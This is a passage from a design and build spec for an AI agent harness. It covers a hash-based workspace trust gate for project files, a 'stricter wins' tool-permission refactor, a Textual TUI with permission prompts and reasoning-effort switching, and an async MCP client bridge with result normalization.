         agents/ and skills/, produces an identical digest -- and the
         directory a definition lives in is what determines how it's
         loaded. Feed the relative path in too, with a separator, so
         concatenation boundaries can't be forged."""
    hasher = hashlib.sha256()
    for root, dirs, files in os.walk(project_venastine_dir):
        dirs.sort()   # deterministic descent -- see (1)
        for fname in sorted(files):
            path = os.path.join(root, fname)
            rel = os.path.relpath(path, project_venastine_dir)
            hasher.update(rel.encode("utf-8"))
            hasher.update(b"\0")
            with open(path, "rb") as f:
                hasher.update(f.read())
            hasher.update(b"\0")
    return hasher.hexdigest()

def is_trusted(project_path: str) -> bool:
    resolved = os.path.realpath(project_path)
    venastine_dir = os.path.join(resolved, ".venastine")
    if not os.path.isdir(venastine_dir):
        return True  # nothing to trust -- no project-level content at all
    current_hash = _content_hash(venastine_dir)
    store = _load_trust_store()
    return store.get(resolved) == current_hash

def grant_trust(project_path: str) -> None:
    resolved = os.path.realpath(project_path)
    venastine_dir = os.path.join(resolved, ".venastine")
    store = _load_trust_store()
    store[resolved] = _content_hash(venastine_dir)
    _save_trust_store(store)

def _load_trust_store() -> dict:
    if not os.path.exists(TRUST_STORE_PATH):
        return {}
    with open(TRUST_STORE_PATH, "r") as f:
        return json.load(f)

def _save_trust_store(store: dict) -> None:
    os.makedirs(os.path.dirname(TRUST_STORE_PATH), exist_ok=True)
    with open(TRUST_STORE_PATH, "w") as f:
        json.dump(store, f, indent=2)
```

**Until trust is granted, project-level `.venastine/` content does not load at all** — agents, skills, `CONTEXT.md`, and `mcp.json` servers are all absent, not loaded-but-disabled. No partial trust. This gate applies uniformly to every kind of project-level content, including `CONTEXT.md` — a project's free-text context is exactly as capable of prompt-injecting a system prompt as an agent file is, and should not be treated as exempt just because it's not technically an "agent."

### New file: `core/config_loader.py`

Discovers and parses every `.md` file across the three tiers, applying the trust gate to the project tier before even attempting to read it. YAML frontmatter parsing must use a **line-anchored delimiter match**, not a raw substring search:

```python
import re

_FRONTMATTER_DELIM = re.compile(r"^---\s*$", re.MULTILINE)

def _parse_frontmatter(text: str) -> tuple[dict, str]:
    """
    Returns (frontmatter_dict, body). Uses a delimiter that must occupy
    its own line -- NOT text.find("---"), which matches the first bare
    '---' anywhere in the file, including a markdown horizontal rule
    inside the body itself (a very common convention in longer
    instructional content, which is exactly what agent/skill bodies are).
    This was a real, easily-triggered bug in the original draft, not a
    rare edge case.
    """
    matches = list(_FRONTMATTER_DELIM.finditer(text))
    if len(matches) < 2:
        raise ValueError("No valid YAML frontmatter block found (need two '---' lines)")
    frontmatter_text = text[matches[0].end():matches[1].start()]
    body = text[matches[1].end():].strip()
    return yaml.safe_load(frontmatter_text), body
```

### `.venastine/settings.json` (structured, project-level, replaces Rev. 1's `config.md` settings fields)

```json
{
  "default_provider": "ANTHROPIC",
  "default_model": "claude-sonnet-5",
  "ensemble_mode": false,
  "compaction": {
    "strength": 3,
    "keep_recent_tokens": 4000,
    "buffer_tokens": 8000,
    "warning_margin_tokens": 2000
  }
}
```

Every key is optional; anything absent falls through to the next tier (D27's resolution order). Compaction values are nested under their own object rather than flattened, so the `COMPACTION_*` family stays visibly one concern as it grows.

### `.venastine/CONTEXT.md` (free text, project-level, replaces Rev. 1's `config.md` notes field)

Plain markdown, no frontmatter needed — this file IS its own content, the same relationship AGENTS.md/QWEN.md have to their respective tools. Injected into an agent's system prompt only if that agent's frontmatter declares `use_project_context: true` — this is opt-in per agent, not automatic for every call, so a simple lookup doesn't pay the token cost of a project summary it doesn't need.

### Agent `.md` file format

```markdown
---
name: security-reviewer
description: Reviews code and research output for security issues
model: claude-sonnet-5
provider: ANTHROPIC
allowed_tools: [read, web_search, symbolic_math]
approval_overrides:
  shell: false      # NOTE: per D14 "stricter wins," this does NOT disable
                    # shell's own approval_check -- both are consulted and
                    # the stricter result applies. See §15.
use_project_context: true
use_memory: true
max_steps: 15
---

## Methodology

You are a security-focused reviewer...
```

### Skill `.md` file format

```markdown
---
name: cybersecurity-research
description: Domain conventions for cybersecurity research tasks
additional_tools: [arxiv_search]
---

## Cybersecurity Research Methodology

When researching vulnerabilities...
```

### `requirements.txt` addition

`pyyaml` (pin explicitly, even if already a transitive dependency).

### Acceptance criteria

1. An untrusted project directory's `.venastine/` content does not load at all — no agents, no skills, no `CONTEXT.md`, no MCP servers — until `grant_trust()` has been called for it.
2. Modifying any file under a previously-trusted project's `.venastine/` changes the content hash and causes `is_trusted()` to return `False` again.
3. A harness-tier agent/skill name collision with a project or user file is rejected with a warning at load time, and the harness-tier version is what actually gets used.
4. A markdown body containing a bare `---` horizontal rule parses correctly (regression test for the frontmatter delimiter bug).
5. `use_project_context: false` (or omitted) means `CONTEXT.md` is never read for that agent's calls, even if trusted and present.

---

## 15. Permission system refactor — "stricter wins" + dynamic tool registration

### New: `ToolContext` dataclass (`tools/context.py`)

```python
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class ToolContext:
    allowed_tools: Optional[set[str]] = None       # None = no restriction from this layer
    approval_overrides: dict[str, bool] = field(default_factory=dict)
    subagent_depth: int = 0                         # see §18 -- threaded through spawn_subagent
```

### The governing rule: "stricter wins" (D14)

Every check consults **every currently active layer** — global `config.ToolPermissions`/`ToolApprovals`, the active agent's `ToolContext` (if any), every active skill's tool additions/overrides (if any), and the tool's own dynamic `approval_check` (if the `ToolSpec` defines one). There is no precedence order between layers in the sense of one overriding another — instead:

- **Allow/deny (`is_tool_allowed`): logical AND across every layer.** A tool is available only if the global policy allows it AND it's within every active agent/skill's `allowed_tools` restriction (when one is declared). A tool disabled globally can never be re-enabled by an agent or skill — that check happens first, unconditionally, before any context is even considered.
- **Approval (`requires_approval`): logical OR across every layer.** Approval is required if the global/tool-level check says so, OR if the active agent's `approval_overrides` says so. **Critically, this includes a tool's own `approval_check` callable** (e.g. `file_ops`'s path-dependent check) — an agent's `approval_overrides` can make a tool require approval it otherwise wouldn't, but it can never make an otherwise-gated tool skip approval `approval_check` itself would still require. This resolves a real gap found during review: the current `dispatch()` lets a tool's `approval_check` bypass the generic `requires_approval()` entirely when present, which would have made agent-level `approval_overrides` silently do nothing for `read`/`write`/`edit`/`shell` — the four tools where per-agent customization matters most.

```python
def is_tool_allowed(tool_name: str, context: Optional[ToolContext] = None) -> bool:
    permissions = config.ToolPermissions()
    if not getattr(permissions, tool_name, _default_for_unknown_tool(tool_name)):
        return False
    if context and context.allowed_tools is not None and tool_name not in context.allowed_tools:
        return False
    return True

def requires_approval(tool_name: str, params: dict, context: Optional[ToolContext] = None) -> bool:
    approvals = config.ToolApprovals()
    tool_level = getattr(approvals, tool_name, False)
    context_level = context.approval_overrides.get(tool_name, False) if context else False
    return tool_level or context_level   # OR, not either/or -- both are always consulted
```

**`tools/registry.py`'s `dispatch()` changes:** the existing `approval_check` precedence (checking the tool's own dynamic callable) is preserved, but its result is now **OR'd with** the context-aware `requires_approval()` result, not used as a full bypass:

```python
def dispatch(self, tool_name, params, context=None, approval_callback=None):
    # (Rev. 3, correction) The unknown-tool guard and the check_output_policy
    # call below are PRESERVED from the current implementation, not new.
    # Rev. 2's sketch of this function omitted both. Written as sketched, it
    # would have deleted ROADMAP §8's secret-redaction layer outright -- in
    # the section whose entire subject is tightening permissions -- and
    # turned an unknown tool name from a clean ValueError into a KeyError.
    # The guard matters MORE now than it did before, not less: MCP tools are
    # registered at runtime and unregistered when a server disconnects, so
    # "this name was valid two minutes ago" becomes a reachable state
    # rather than a programming error.
    if tool_name not in self._tools:
        raise ValueError(f"Unknown tool: {tool_name}")

    if not is_tool_allowed(tool_name, context):
        raise ToolCallDenied(f"{tool_name} is disabled by policy")

    spec = self._tools[tool_name]

    tool_level_approval = (
        spec.approval_check(tool_name, params)
        if spec.approval_check is not None
        else False
    )
    needs_approval = tool_level_approval or requires_approval(tool_name, params, context)

    if needs_approval:
        approved = approval_callback(tool_name, params) if approval_callback else False
        if not approved:
            raise ToolCallDenied(f"{tool_name} requires approval and was not given")

    result = spec.handler(params)
    result = check_output_policy(tool_name, result)   # PRESERVED -- ROADMAP §8
    return result
```

**General rule this incident produces (see "Why," below):** where a section of this document restates an existing function in order to change part of it, the restatement is not a specification of the whole function. Diff it against the real implementation before treating it as complete. Rev. 2 made this mistake twice in code sketches (here and §13's persist ordering) and once in prose (§13's two-of-three wrapper list), which is enough of a pattern to name.

### Dynamically-named tools (MCP), and why the static dataclass model needed a fallback

`config.ToolPermissions`/`ToolApprovals` are static dataclasses with one hardcoded boolean field per known tool name. MCP tools are named dynamically at connection time (`mcp__<server>__<tool>`) and can never have a pre-declared field. `getattr(permissions, tool_name, False)` — the current pattern — would silently deny every MCP tool by default, permanently, outside of an agent context that happens to declare it in `allowed_tools`. `_default_for_unknown_tool(tool_name)` resolves this explicitly rather than leaving it to an accidental `getattr` default:

```python
def _default_for_unknown_tool(tool_name: str) -> bool:
    """Dynamically-registered tools (MCP, currently) get an explicit,
    named default rather than silently inheriting getattr's fallback.
    Default: MCP tools are allowed by default (their own server-level
    trust gate, per §17, is the actual control point), everything else
    unknown is denied by default."""
    if tool_name.startswith("mcp__"):
        return True
    return False
```

### Live bug found while specifying the above: `fetch_url` has never been callable (Rev. 3, D24)

Making omission *meaningful* for MCP tools surfaced a case where omission was *accidental* for a built-in one. `fetch_url` is registered in `tools/registry.py`, documented as Working in ARCHITECTURE.md §423, and enforced against the blocked-domain list per DEVLOG §8 — but it has no field in `config.ToolPermissions`. `getattr(permissions, "fetch_url", False)` therefore returns `False`, and `dispatch()` has been raising `ToolCallDenied("fetch_url is disabled by policy")` for every call since the tool was added. It is absent from `ToolApprovals` too. Verified by executing the real check against all 14 registered tools; `fetch_url` is the only one affected.

The failure mode is quiet in a specific way worth noting: the tool's schema is still advertised to the model on every call, so the model keeps choosing it, and the only trace is a denial string inside a tool result the model then works around. Nothing logs, nothing raises, and the deep-research pipeline's grounding passes lose a source-fetching capability the architecture assumes they have.

Two changes, and the second is the one that matters:

1. Add `fetch_url` to both `ToolPermissions` and `ToolApprovals`. **Confirm the intended defaults first** — `web_search: True` suggests `fetch_url: True` was intended, but it fetches arbitrary URLs, so `approvals.fetch_url` is a real decision rather than a copy of its neighbour.
2. **Add an import-time consistency check** that every name in `registry._tools` has a declared field in both dataclasses, raising on mismatch. Without it, the same defect recurs the next time a tool is added — and this is the second time this exact shape has occurred in this file (ARCHITECTURE.md §441 records the first: a registry that imported five tools and registered one). A gap that recurs is a missing invariant, not a mistake.

The check must run *after* MCP registration is understood to be exempt: dynamically-named `mcp__*` tools are covered by `_default_for_unknown_tool()` by design, so the assertion applies to statically-registered tools only.

### Acceptance criteria

1. A globally-disabled tool cannot be re-enabled by any agent or skill context — verified with a test that sets `config.ToolPermissions().shell = False` and an agent context that explicitly allows `shell`.
2. An agent's `approval_overrides` requiring approval for a normally-auto-approved tool (e.g. `symbolic_math`) is honored — an agent CAN tighten a lenient default, this is a real, intended capability, not just a restriction.
3. An agent's `approval_overrides: {shell: false}` does NOT suppress `shell`'s own path/command-dependent `approval_check` — this is the specific regression test for the gap found during review.
4. An MCP tool (name starting `mcp__`) is available by default with no agent context active, rather than being silently denied.
5. **(Rev. 3) `check_output_policy()` still runs on every dispatched tool result after the refactor** — assert directly that a handler returning a string containing a recognized secret pattern comes back redacted. `tests/test_policy_enforcement.py` has the patterns already; this criterion exists because the refactor sketch dropped the call, so "it still works" needs to be proven rather than assumed.
6. **(Rev. 3, D24) Every statically registered tool has a field in both `ToolPermissions` and `ToolApprovals`** — a test that walks `registry._tools` and asserts `hasattr` on both, which fails today on `fetch_url` and is the regression guard afterward.
7. **(Rev. 3) `dispatch()` on an unregistered name raises `ValueError`, not `KeyError`** — including after an MCP server has been unregistered mid-session, which is the realistic trigger.

---

### Built

Implemented as specified, with four deliberate deviations and one correction to this section's own sketch. Full decision record in DEVLOG.md §15.

**All seven acceptance criteria pass** (`tests/test_permission_context.py`, 21 tests). Suite: 272 → 307.

**Deviations from the sketch above, each user-approved before implementation:**

1. **The approval OR-composition lives in `ToolRegistry.approval_needed()`, not inlined in `dispatch()`.** The `dispatch()` sketch above was written against pre-§13 code and does not mention `approval_needed()` — which §13 introduced precisely as the single source of truth shared by `dispatch()` AND `_run()`'s permission bridge (ARCHITECTURE §4.8). Implemented literally, `dispatch()` would have gained stricter-wins while the loop's bridge kept the old `approval_check`-as-full-bypass behaviour, so an agent's `approval_overrides` would be honoured on one code path and silently ignored on the other. **This is this document's own "an abbreviated restatement of existing code is a proposal to delete whatever it abbreviates" rule (see *Why these calls*) applying to §15 one revision after it was written down** — the sketch is correct about the composition and stale about where it belongs.

2. **`_run()`'s `allowed_tools` parameter is replaced by `context`, not kept alongside it.** The two expressed the same restriction at different layers, and §18's own sketch passes the same set through both channels (`ToolContext(allowed_tools=child_allowed)` *and* `run_agent_conversation(..., allowed_tools=child_allowed)`). `_run()` no longer performs a membership check of its own; `is_tool_allowed(name, context)` inside `dispatch()` covers it. The three public wrappers gained a `context=None` kwarg so §18 does not have to reopen their signatures.

3. **`registry.schemas()` filters by policy** — not specified here at all. The `fetch_url` defect's entire damage was that the schema stayed advertised while the call was denied, so the model kept choosing it and burning a turn per attempt. Fixing the instance without the shape would leave `read`/`write`/`edit` (all permission `False` by default) doing exactly the same thing. Advertised tools under default config: 10 of 15 registered. **Note for §19:** this makes the staleness item in *Lower-priority items* live sooner — schemas are still computed once at the top of `_run()`, so a skill activated mid-session will not appear until the next turn.

4. **`dispatch()` distinguishes two denial causes** — "not available in this context" vs "disabled by policy". A context restriction is something the model can route around by choosing another tool; a global denial is not. The pre-§15 loop produced the first message from its own membership check, so collapsing both into one string would have been a regression disguised as consolidation.

**`fetch_url` defaults (the confirmation this section asks for):** permission `True`, approval `False`. Approval `True` would leave it unusable wherever there is no `permission_channel` to answer the prompt — the CLI chat loop and every research pass — which is the same outcome as the D24 bug with a different error string. It remains constrained by `policy_enforcement`'s blocked-domain list, and its output goes through secret redaction like every other tool's.

**D24 check placement:** the helper is `security.permissions.assert_permissions_declared()`, called from the bottom of `tools/registry.py` after the static registrations. It lives in `permissions.py` because that file owns knowledge of the dataclasses, and is *called* from `registry.py` because `permissions.py` must not import the registry — the dependency runs `tools -> security`, one way. Verified live, not just unit-tested: deleting `ToolPermissions.fetch_url` makes `import tools.registry` raise.

**`unregister()`** ships here (D15 assigns it to this section and AC7's stated trigger cannot be exercised without it). Idempotent — disconnect handling can run more than once for the same server. §17 only has to call it.

**Also fixed in this cycle** — five findings from the §14 review, which had been tested but never reviewed: unhandled config errors reaching the user as a traceback; `compaction` settings replacing rather than deep-merging across tiers; silent same-tier name collisions; the frontmatter block not being anchored to the start of file; and `load_skill` being advertised with an empty catalog (solved via a new `ToolSpec.available_check`, keeping skill knowledge out of the registry). See DEVLOG §15.4.

---

## 16. TUI — Textual app + widgets + slash commands + streaming integration

**This section was rewritten during implementation, because it could not be built from what it said.** Rev. 3 described §16 as "Unchanged from Rev. 1 in overall shape" and made acceptance criterion 1 "All Rev. 1 acceptance criteria" — but Rev. 1's text no longer exists anywhere in this repository; Revision 3 overwrote it. What survived was a one-line gloss (Textual app, `ModalScreen` for thread picker / permission prompts, slash command registry, `run_worker(thread=True)`) plus two Rev. 3 corrections. The baseline TUI — layout, widget set, slash-command surface, mode toggle — was unspecified.

**The general lesson, and it is a different one from Rev. 3's "abbreviated restatement" rule:** a section that defers to another *document revision* rather than to another *section* has a dangling reference the moment that revision is replaced. Cross-references by section number survive revisions (that is why this document says section numbers are stable); cross-references to "Rev. 1" do not. Where a section is genuinely unchanged, restate its acceptance criteria rather than pointing at a revision that will be overwritten.

### Scope: the shell, not the capabilities

§16 ships a complete, polished TUI **shell**. Capabilities land in the section that owns them and register into the shell.

This is forced by D12, which makes the CLI a permanent fallback that is never removed. A capability implemented inside `tui/` is invisible to the CLI *and* to the research pipeline — so a question tool, a todo list, or a goal mode written here would be a feature only one of three entry points can use. The shell hosts; it does not own.

### Components

- `tui/app.py` — the `App`. Event routing, the worker, slash-command dispatch, both ravens.
- `tui/widgets.py` — transcript (with Rich `Syntax` highlighting for fenced code), raven panels, research progress.
- `tui/commands.py` — the slash-command registry. Mechanism only; §18/§19/§21 register into it, exactly as `tools/registry.py` holds dispatch mechanics while `security/permissions.py` holds policy.
- `tui/screens.py` — `ModalScreen`s for the permission prompt and the thread picker.
- `tui/themes.py` — eight themes (dark/light × plain/red/green/blue).
- `tui/ravens.py` — mascot art and the activity-state table.

### Streaming and the permission bridge (fixes C1)

`_run()` is already a generator yielding `LoopEvent` (§13), and `permission_channel` already exists, so the app needs no new loop machinery:

```python
def run_agent_turn(self, user_input: str):
    channel = queue.Queue()
    generator = RunAgentLoop._run(..., permission_channel=channel)
    self.run_worker(lambda: self._consume(generator),
                    thread=True, exit_on_error=False)

def _consume(self, generator):
    for event in generator:
        self.post_message(LoopEventMessage(event))   # thread-safe hand-off
```

The worker thread blocks inside `_run()` on `permission_channel.get()`; the UI thread shows the modal and puts the decision on the queue. **Nothing re-enters or restarts the generator** — that is what AC2 asserts, and it asserts it against the dispatched tool rather than against the modal appearing, because a modal that renders and then drops the answer leaves the worker blocked forever. That failure presents as a hang, not as an error.

**Every dismissal path must produce a boolean.** Escape, and any dismissal carrying `None`, resolve to a denial. A `None` reaching `channel.put()` would unblock the worker with a non-answer; a dismissal that puts nothing at all never unblocks it.

### Worker error handling (verified, not assumed)

An exception inside a `thread=True` worker does not propagate to the caller of `run_worker()`. Textual catches it, moves the worker to `WorkerState.ERROR`, and exposes it on `event.worker.error`. **`exit_on_error` defaults to `True`**, so an unhandled transient network error would terminate the whole app. `exit_on_error=False` plus an `on_worker_state_changed` handler are both required.

Confirmed against textual 1.0.0's real signature during implementation rather than assumed: `run_worker` takes `exit_on_error` and `thread`, and `Worker.StateChanged` / `WorkerState.ERROR` exist as described.

### The two ravens

**Corner raven — activity.** Driven entirely by the `LoopEvent` stream already flowing to the UI: `token_delta` → thinking, `tool_call_start` → a per-tool state (searching / reading / editing / running), `permission_request` → waiting, `final_response` → idle. **Unknown tool names map to a generic working state**, so §17's runtime-registered MCP tools and §18's subagents animate without the table being edited.

**Small raven — reasoning effort.** Renders the current level so the setting is visible rather than remembered.

**Animation must not compete with token streaming.** A redraw loop running against incoming deltas is the one place the mascot costs responsiveness rather than merely effort; animation pauses while a stream is active, and `tui.animations` disables it outright.

### Reasoning-effort switching

`core/client.py` gains `_thinking_for_provider()` alongside `_tools_for_provider()` / `_messages_for_provider()` — the same translate-at-the-boundary case. The three providers do not share a concept:

| Provider | Shape | Valid values |
|---|---|---|
| Anthropic | `output_config.effort` + `thinking: {type: "adaptive"}` | Enum, **queryable** per model via `capabilities.effort` on the Models API |
| OpenAI-compatible | `reasoning_effort` | Enum, reasoning models only; no capability endpoint on any provider in `providers.json` |
| Google | `thinking_config.thinking_budget` | An **integer budget**, not an enum at all |

So `effort_levels_for_model()` queries Anthropic and tabulates the rest — a newly released Anthropic model needs no entry anywhere in this repo, which is the whole reason to query rather than tabulate uniformly. Falling back logs at WARNING, matching §21's `MODEL_CONTEXT_WINDOWS` posture.

**Effort is opt-in (`None` sends nothing).** This is load-bearing, not a default chosen for tidiness: `reasoning_effort` is rejected by OpenAI-compatible *non-reasoning* models, and `thinking: {type: "adaptive"}` is rejected by pre-4.6 Anthropic models. Silence is the only universally safe value, so every pre-§16 caller behaves exactly as before.

**`config.MAX_TOKENS` was raised from 4096.** On current Anthropic models `max_tokens` caps thinking **plus** response text together, so the old value truncated answers mid-sentence the moment effort was enabled. Shipping the picker without this would have shipped a feature that breaks the thing it attaches to.

### Prerequisite fixed here: ensemble mode could not run

`orchestrator.py` passed `temperature=config.ENSEMBLE_TEMPERATURE` into `call_model`, and current Anthropic models reject sampling parameters — removed outright on Opus 5 / 4.8 / 4.7 and Fable 5, non-default values rejected on Sonnet 5, which is `config.MODEL_NAME`'s default. ROADMAP §10 was built, documented as working, and **could not execute against this harness's own default model**. It never surfaced because `ENSEMBLE_MODE = False`, and §14 shipped the first convenient way to turn it on.

Two changes: `call_model`/`call_model_stream` omit sampling parameters where the model rejects them, and the orchestrator **refuses** to run ensemble mode on such a model. Refusing rather than silently dropping the parameter is the point — dropping it would generate `ensemble_n` identical candidates, spend N× the tokens, and then report maximal cross-candidate consistency for every claim, feeding a falsely confident score into Pass 4. Redesigning §10's diversity mechanism was a deferred **§10 revisit**.

> **That revisit has since landed, and it did NOT take the prompt-level variation this section proposed.** Framings partition what each candidate looks for, so an omission becomes a systematic bias rather than noise. Diversity comes from a roster of different models (`config.ENSEMBLE_MODELS`), which needs no sampling parameter at all — so the refusal above no longer applies to ensemble mode, and AC5 below is superseded. `ENSEMBLE_TEMPERATURE` is deleted; `_sampling_kwargs` and its WARNING are kept as a backstop for the next caller. Decisions E1–E12 are in DEVLOG's §10-revisit entry.

### Research mode

Coarse by construction. `run_deep_research_pipeline()` is synchronous and reports nothing while running: each pass is drained through `run_to_completion()` inside the orchestrator, so no `LoopEvent` escapes, and the per-pass checkpoints it does write go to the database rather than to a caller. §16 therefore runs the pipeline on a worker (the app stays responsive, the raven animates) and renders the trace and report on completion. Live pass-by-pass progress, per-claim tier updates, and token streaming inside a pass require the pipeline to emit events — that is **§22**.

### Acceptance criteria

1. Slash commands dispatch through a registry other sections can register into; an unknown command reports itself rather than becoming a chat turn. Thread switching via `storage.list_threads()` (already exists — no `storage.py` change). Provider/model shown; theme and effort switchable at runtime.
2. A permission prompt shown mid-loop resumes the SAME generator with the user's response, verified end to end **against the dispatched tool**, not against the modal rendering. Denial and Escape both block the tool and both let the turn finish.
3. A tool call that raises results in a visible, graceful error notification, not an app crash — verified with `exit_on_error=False` explicitly set and a forced exception in a mocked tool call, and with the raven returning to idle rather than sticking mid-activity.
4. **(§16)** Effort switching offers only levels the current model reports, and the chosen level reaches the provider payload — asserted on the translated call arguments, not on the UI.
5. **(§16)** Ensemble mode on a sampling-rejecting model raises a clear error naming the model, before any LLM call or `PipelineRunRecord` row. **Superseded by §10's revisit** — ensemble mode no longer uses sampling variation, so it now runs on those models; what raises before any work is an unusable *roster* (`_ensemble_roster`), and the before-any-work half of this criterion carried over intact.

### Built

Implemented as specified above. **335 tests pass** (307 → 335). Full decision record in DEVLOG.md §16.

- `tui/` package (app, widgets, commands, screens, themes, ravens, `app.tcss`), `main.py --tui`.
- `core/client.py`: `_sampling_kwargs()`, `_thinking_for_provider()`, `effort_levels_for_model()`, `_google_supports_thinking_budget()`.
- `core/loop.py`: `effort` threaded through `_run()` and all three public wrappers.
- `config.py`: `MODELS_REJECTING_SAMPLING_PARAMS`, `MODEL_EFFORT_LEVELS`, `GOOGLE_THINKING_BUDGETS`, `DEFAULT_EFFORT`, `MAX_TOKENS` 4096 → 16000.
- `core/config_loader.py`: `_KNOWN_TUI`, and `_NESTED_SETTINGS` so the deep-merge stops naming sections inline.
- `core/reasoning/orchestrator.py`: the ensemble guard.

**One deviation, found by checking rather than assuming:** the pinned `google-genai==1.0.0` has a `ThinkingConfig` whose only field is `include_thoughts` — `thinking_budget` arrived in a later release, so the obvious implementation raises a `TypeError` against the version this repo actually pins. Rather than move the pin (which would put §9's verified Google implementation back in scope for retest to gain a feature Google users can do without), `_google_supports_thinking_budget()` checks the installed SDK and reports **no effort levels** on Google until the pin moves. D22's rule, applied to a second dependency.

---

## 17. MCP client — stdio + HTTP/SSE + `mcp.json` + async bridge + workspace trust

**This section changed the most of any in Rev. 2.** Rev. 1's `_make_handler()` returned a plain synchronous function that called `conn.call_tool(...)` directly — but the official MCP Python SDK is `async`/`await` end to end with no synchronous surface at all (verified against current SDK documentation, not assumed from memory). That function as written would crash or hang depending on caller context. Per D2a, the fix is a dedicated background thread owning one persistent event loop for all MCP traffic. **That decision survives Rev. 3's verification unchanged** — the async-only shape holds in both the current and the next major version of the SDK, so the bridge is the right call regardless of which one is pinned.

### (Rev. 3) The SDK is mid-major-version transition — pin it (D22)

Rev. 2's Open Question 6 asked whether §17's call shapes match the SDK's real signatures. Checking that turned out to matter more than expected, because the answer is version-dependent *right now*:

- **v1.x** is what §17's sketch targets, and its client API is confirmed correct in shape: `ClientSession(read, write)` wrapped around a transport context manager (`stdio_client(StdioServerParameters(...))` for stdio, `streamable_http_client(url)` for HTTP), `await session.initialize()` before any call, then `await session.call_tool(name, arguments={...})`. Note `arguments=` is a keyword, and `list_tools()` returns a result object whose `.tools` holds the tool list — not a bare list.
- **v2** reworks the client into a single `Client` that accepts a URL, a stdio subprocess, a custom transport, or an in-memory server object, with `await client.call_tool(...)` and `.structured_content` on the result. The SDK's own README instructs dependents to add a **`<2` upper bound** to their version constraint before v2 stable lands.
- The two lines' documentation disagreed at the time of writing about which is currently stable, so **treat the current state as unresolved and check at implementation time** — but that ambiguity is itself the argument for pinning rather than a reason to delay.

Concretely: `requirements.txt` gets an explicit pin with an upper bound (`mcp>=1.27,<2` if targeting v1.x as sketched). Rev. 2's dependency table specified `pyyaml` as "pin explicitly, even if already a transitive dependency" while leaving `mcp` — the only dependency actually mid-break — unpinned; that inconsistency is corrected in the table below.

Two things make v2 worth migrating to deliberately rather than resisting. Its unified `Client` collapses the stdio-vs-HTTP transport branch this section currently needs. And its in-memory transport connects a client straight to a server object with no subprocess and no sockets — which directly answers the "test infrastructure for the async bridge needs its own planning pass" item this document currently carries as deferred work.

### (Rev. 3) Session lifetime: sessions cannot outlive their context managers

`_connect_all_async()` as sketched does `_servers[name] = await self._connect_one(name, cfg)` and stores the session in a module-level dict. In v1.x both the transport and `ClientSession` are **async context managers**, so the natural implementation of `_connect_one` — `async with stdio_client(...) as (r, w): async with ClientSession(r, w) as s: await s.initialize(); return s` — returns a session that is *already closed*, because both `__aexit__` calls run before the return. Every subsequent `call_tool()` then fails.

The correct shape is an `AsyncExitStack` owned by the MCP loop and kept open for the process lifetime: `await stack.enter_async_context(...)` for the transport, then for the session, and the stack is closed only on shutdown. This must live on the dedicated MCP event loop — entering an async context on one loop and exiting it on another is undefined behavior, which is a second reason the single-owning-loop design in D2a is load-bearing rather than merely convenient.

That implies a shutdown path Rev. 2 didn't specify at all: `disconnect_all()` closing the exit stack via the same `run_coroutine_threadsafe` bridge, then `loop.call_soon_threadsafe(loop.stop)`, joined with a timeout. This is not tidiness — **stdio servers are child processes this harness spawned.** The `daemon=True` thread dies abruptly at interpreter exit without unwinding the stack, and the failure mode is orphaned subprocesses accumulating across sessions. Wire it to the same place the TUI and CLI already tear down.

### New file: `mcp/client.py`

```python
import asyncio
import threading

_mcp_loop: Optional[asyncio.AbstractEventLoop] = None
_mcp_thread: Optional[threading.Thread] = None
_servers: dict[str, "ClientSession"] = {}

def _ensure_mcp_loop() -> asyncio.AbstractEventLoop:
    global _mcp_loop, _mcp_thread
    if _mcp_loop is None:
        _mcp_loop = asyncio.new_event_loop()
        _mcp_thread = threading.Thread(target=_mcp_loop.run_forever, daemon=True)
        _mcp_thread.start()
    return _mcp_loop

class MCPClient:
    def __init__(self, server_configs: dict):
        self.server_configs = server_configs   # WAS missing entirely in Rev. 1 -- a real bug (C10)

    def connect_all(self) -> None:
        """Connects to every configured server. Runs on the dedicated MCP
        loop via the bridge below, even though this method itself is
        called synchronously from ordinary startup code."""
        loop = _ensure_mcp_loop()
        future = asyncio.run_coroutine_threadsafe(self._connect_all_async(), loop)
        future.result(timeout=30.0)

    async def _connect_all_async(self) -> None:
        for name, cfg in self.server_configs.items():
            _servers[name] = await self._connect_one(name, cfg)

    def call_tool(self, server_name: str, tool_name: str, params: dict, timeout: float = 180.0) -> dict:
        """The synchronous entry point every ToolSpec.handler actually
        calls. Looks completely ordinary to registry.dispatch() regardless
        of whether the caller is on Textual's main loop, a worker thread,
        or a plain synchronous CLI script -- the bridge is what makes this
        true from any of those contexts."""
        loop = _ensure_mcp_loop()
        coro = _servers[server_name].call_tool(tool_name, params)
        future = asyncio.run_coroutine_threadsafe(coro, loop)
        return future.result(timeout=timeout)   # 180s default (S12) -- MCP servers can be slow/hang
```

`_make_handler(server_name, tool_name)` now just returns `lambda params: mcp_client.call_tool(server_name, tool_name, params)` — a genuinely plain sync function, no bridging logic leaking into the tool layer itself.

### (Rev. 3) Result normalization at the bridge (D23)

`call_tool()` above is annotated `-> dict` but returns `future.result(...)` unchanged, which is the SDK's `CallToolResult` — a pydantic object carrying `.content` (a list of typed content blocks: `TextContent`, `ImageContent`, `EmbeddedResource`), `.structuredContent`, and `.isError`. Everything downstream of `dispatch()` assumes a plain dict, and two things break concretely:

- `check_output_policy()` calls `result.get(key)` and would raise `AttributeError` on a pydantic model. So MCP tool output — the output most likely to come from code the user didn't write — is exactly the output that would crash, or worse, bypass secret redaction.
- `memory.add_tool_result()` does `str(result)`, persisting a pydantic repr into the thread rather than readable content.

So `call_tool()` converts before returning, once, at the boundary:

```python
def _normalize(result) -> dict:
    """CallToolResult -> the plain dict shape every other tool handler
    returns. MCP signals tool failure IN BAND via isError rather than by
    raising, so it maps onto the same {"error": ...} convention _run()
    already understands for ToolCallDenied and disallowed-tool cases --
    no new error channel, no special-casing in the loop."""
    text = "\n".join(b.text for b in result.content if getattr(b, "type", None) == "text")
    if result.isError:
        return {"error": text or "MCP tool call failed"}
    out = {"content": text}
    if result.structuredContent is not None:
        out["result"] = result.structuredContent
    return out
```

`content` and `result` are deliberate key choices: both are already in `safety/policy_enforcement.py`'s `_SCANNED_KEYS`, so MCP output gets secret-redacted by the existing layer with no change to it. Non-text content blocks (images, embedded resources) are dropped to text placeholders for now — the harness has no multimodal tool-result path today, and inventing one here would be scope the rest of the design doesn't support yet.

### `mcp.json` and workspace trust

